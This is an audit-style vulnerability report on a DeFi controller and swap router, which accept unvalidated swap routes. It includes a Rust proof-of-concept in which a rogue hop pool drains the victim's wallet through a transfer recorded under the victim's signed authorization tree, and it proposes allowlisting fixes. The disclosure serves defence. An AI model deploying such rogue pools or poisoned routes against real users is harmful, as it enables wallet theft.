### Title
Unvalidated user-supplied swap route lets a rogue hop pool inject a wallet-draining `transfer` into the caller's signed auth tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
The controller forwards the caller-supplied `StrategySwap` payload verbatim to the configured swap aggregator and neither contract keeps an allowlist of the pool/token addresses the route names. Like the Mattermost invitation-token bug — where a crafted, unvalidated token tricks a user into an action bound to attacker-controlled data — a crafted route here places attacker code on the call stack beneath the victim's `require_auth`, and any `token.transfer(victim, attacker, x)` it makes is recorded as a child of the victim's authorization entry and executes if the victim signs that tree.

### Finding Description
`process_swap_collateral` (and the `swap_debt`, `repay_debt_with_collateral`, `multiply`/`flash_position` strategy paths, which funnel through `withdraw_and_swap_from_supply`) passes the user-provided `swap` bytes to `swap_tokens` with only an emptiness check: [1](#0-0) . `swap_tokens` authorizes one exact input transfer, then calls `router.execute_strategy(controller, amount_in, swap)` without inspecting the route contents: [2](#0-1) . The router "calls the pool and token addresses its payload names and keeps no allowlist of them," so third-party code runs below the caller's authorization, and "a token transfer that such code makes from the caller is recorded by an honest simulation as a child of the caller's authorization entry, and it executes if the caller signs that tree": [3](#0-2) .

The harness PoC deploys a `RogueHopPool` whose `swap()` does `token.transfer(alice, attacker, WALLET_BALANCE)`, routes `swap_collateral` through it, and shows simulation recording the stolen transfer as a sub-invocation of Alice's `swap_collateral` auth entry: [4](#0-3) [5](#0-4) . In enforcing mode the same route succeeds only when Alice signs the poisoned tree: [6](#0-5) . The same exposure applies to direct `execute_strategy` callers of the router, where `sender.require_auth()` is the only signature and the route pool set is unchecked: [7](#0-6) .

### Impact Explanation
Theft of user funds. The drained amount is the victim's wallet balance of *any* token — including tokens the protocol never listed — not just the routed amount. "The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it": [8](#0-7) . The PoC empties a 77,770-unit wallet balance in a single signed call: [9](#0-8) .

### Likelihood Explanation
Any unprivileged user can submit a `swap` payload via `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, or `multiply`, and any user can call the router's `execute_strategy` directly. The attack requires tricking a victim into signing a route whose venue address is attacker-controlled — the standard phishing/simulation flow, since honest `simulateTransaction` output embeds the malicious transfer inside an otherwise legitimate-looking auth tree (the swap itself even executes fairly, so balances and risk checks all pass). This is the exact trust trick of the source advisory: crafted unvalidated input bound into a user-signed action. Mitigating factors: the victim must sign a tree containing the extra child, and route bytes normally come from a quote service, so exploitation needs either a malicious/compromised quote path or social engineering. Medium-to-High likelihood for a wallet-draining primitive.

### Recommendation
Validate the route on-chain rather than trusting its addresses. Options: (a) the router/controller maintains a governance-allowlisted set of venue pool addresses and rejects hops naming unlisted contracts; (b) pin the set of permitted pool contracts per venue at market/oracle configuration time; (c) failing on-chain allowlisting, have the controller verify that the produced authorization children under the caller's entry are limited to the single expected input `transfer` — the doc notes an honest strategy "gives the caller no child entry, and a direct router swap gives exactly one input transfer": [10](#0-9) . At minimum, clients must decode the route and refuse any auth tree with unexpected children, but enforcement belongs in the contract.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: an attacker deploys `RogueHopPool` preconfigured to `transfer` Alice's unlisted wallet token to the attacker, crafts a `RoutedSwap` naming that pool, and Alice calls `controller.swap_collateral(alice, account_id, USDC, 5000, ETH, route)`. Recording-mode simulation shows the rogue transfer attached under Alice's `swap_collateral` auth entry; with the poisoned tree signed, `wallet(alice) == 0` and `wallet(attacker) == WALLET_BALANCE` while the swap still delivers fair ETH output: [11](#0-10) [12](#0-11) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** skills/xoxno-swap-aggregator/payload.md (L111-113)
```markdown
The only signature is the sender's. `execute_strategy` calls `sender.require_auth()`, and the sender's auth entry must cover the nested `token_in.transfer(sender, router, total_in)`; simulation produces that tree (`transaction.simulated = true` envelopes already carry it — `attach_simulated_transaction` copies the simulator's `auth` into the op — and `simulateTransaction` produces it for a locally built one). Do **not** `transfer` or `approve` tokens to the router beforehand: the router pulls the input itself, and tokens sent ahead of time are not credited.

Every venue call is self-authorized by the router with invoker-contract auth (`venues/auth.rs::authorize_as_current` → `env.authorize_as_current_contract`): Phoenix and Sushi (`HopContext::authorize_pool_pull`) and Aquarius (`aquarius/pool.rs::invoke_pool_swap`) register `token_in.transfer(router, pool, amount_in)` before the pool pulls; Comet registers `token_in.approve(router, pool, amount_in, expiry)`, then `swap_exact_amount_in` with a nested entry for the pool's `transfer_from`, then clears the allowance; Soroswap transfers from the router to the pool directly. None of these appear in the sender's auth tree.
```
